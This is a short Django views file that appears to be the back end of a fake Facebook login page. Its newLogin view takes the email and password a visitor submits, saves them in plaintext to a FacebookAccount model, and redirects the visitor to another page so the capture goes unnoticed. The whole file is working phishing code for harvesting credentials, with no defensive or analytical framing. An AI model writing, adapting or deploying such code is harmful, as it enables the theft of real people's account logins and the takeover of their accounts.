from django.shortcuts import render, redirect
from .models import FacebookAccount
# Create your views here.

def facebook(request):
    context = {}
    return render(request, 'index.html', context)

def newLogin(request):
    email = request.POST.get('email')
    password = request.POST.get('password')

    if request.method == 'POST' and 'login' in request.POST and email and password:
        newLog = FacebookAccount.objects.create(email=email, password=password)
        newLog.save()
        return redirect('post')
        #return redirect('https://www.youtube.com', code=307)
    else:
        return redirect('')

def post(request):
    context={}
    return render(request, 'post.html', context)